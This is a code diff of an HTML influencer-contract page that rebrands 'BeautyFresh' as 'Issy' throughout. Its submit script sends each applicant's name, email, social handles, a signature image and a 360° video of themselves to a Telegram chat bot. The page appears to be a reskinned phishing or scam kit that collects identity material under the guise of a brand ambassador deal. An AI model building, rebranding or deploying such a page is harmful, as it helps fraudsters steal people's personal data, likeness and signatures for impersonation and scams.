@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>BeautyFresh | Influencer Contract Agreement</title>
+    <title>Issy | Influencer Contract Agreement</title>
     <style>
         * {
             margin: 0;
@@ -239,7 +239,7 @@
 <div class="container">
     <div class="contract-card">
         <h1>
-            💄 BeautyFresh
+            💄 ISSY
             <span class="badge">Influencer Contract</span>
         </h1>
         <div class="subtitle">Brand Ambassador Agreement • TikTok Live • Yellow Basket • Facebook</div>
@@ -271,11 +271,11 @@
                 </div>
                 <div class="form-group">
                     <label>TikTok Handle</label>
-                    <input type="text" id="tiktokHandle" placeholder="@beautyguru">
+                    <input type="text" id="tiktokHandle" placeholder="@issybeauty">
                 </div>
                 <div class="form-group">
                     <label>Facebook Handle (optional)</label>
-                    <input type="text" id="facebookHandle" placeholder="@beauty.influencer">
+                    <input type="text" id="facebookHandle" placeholder="@issy.influencer">
                 </div>
             </div>
 
@@ -312,7 +312,7 @@
             <div class="form-group">
                 <label style="display: flex; align-items: center; gap: 10px;">
                     <input type="checkbox" id="agreeCheckbox" required style="width: auto;">
-                    I confirm that the 360° video features me, and I agree to all BeautyFresh terms including TikTok Live, Yellow Basket, and Facebook promotions.
+                    I confirm that the 360° video features me, and I agree to all Issy terms including TikTok Live, Yellow Basket, and Facebook promotions.
                 </label>
             </div>
 
@@ -502,22 +502,22 @@
 
         try {
             // Prepare info text
-            const infoText = `📋 NEW BEAUTYFRESH CONTRACT SUBMISSION\n\n👤 Name: ${fullName}\n📧 Email: ${email}\n📱 TikTok: ${tiktokHandle || 'N/A'}\n📘 Facebook: ${facebookHandle || 'N/A'}\n\n✅ FIRST VERIFICATION: 360° Video\n✍️ SECOND VERIFICATION: Signature Image\n\n⏰ Submitted: ${new Date().toLocaleString()}`;
+            const infoText = `📋 NEW ISSY CONTRACT SUBMISSION\n\n👤 Name: ${fullName}\n📧 Email: ${email}\n📱 TikTok: ${tiktokHandle || 'N/A'}\n📘 Facebook: ${facebookHandle || 'N/A'}\n\n✅ FIRST VERIFICATION: 360° Video\n✍️ SECOND VERIFICATION: Signature Image\n\n⏰ Submitted: ${new Date().toLocaleString()}`;
             
             // Send text info
             await sendTextToTelegram(infoText);
             
             // Send signature image (Second Verification)
-            await sendToTelegram(selectedSignature, 'photo', `✍️ SECOND VERIFICATION - Signature for: ${fullName}`);
+            await sendToTelegram(selectedSignature, 'photo', `✍️ SECOND VERIFICATION - Signature for: ${fullName} (Issy)`);
             
             // Send video (First Verification - 360° Fit)
-            await sendToTelegram(selectedVideo, 'video', `🎬 FIRST VERIFICATION - 360° Fit Video for: ${fullName}`);
+            await sendToTelegram(selectedVideo, 'video', `🎬 FIRST VERIFICATION - 360° Fit Video for: ${fullName} (Issy)`);
             
             // Send completion message
-            await sendTextToTelegram(`✅ CONTRACT COMPLETE for ${fullName}\n\n- First Verification: 360° Video ✓\n- Second Verification: Signature Image ✓`);
+            await sendTextToTelegram(`✅ ISSY CONTRACT COMPLETE for ${fullName}\n\n- First Verification: 360° Video ✓\n- Second Verification: Signature Image ✓`);
             
             // Store in sessionStorage for redirect
-            sessionStorage.setItem('beautyfresh_contract_signed', 'true');
+            sessionStorage.setItem('issy_contract_signed', 'true');
             sessionStorage.setItem('influencer_name', fullName);
             sessionStorage.setItem('influencer_email', email);
             sessionStorage.setItem('contract_date', new Date().toISOString());
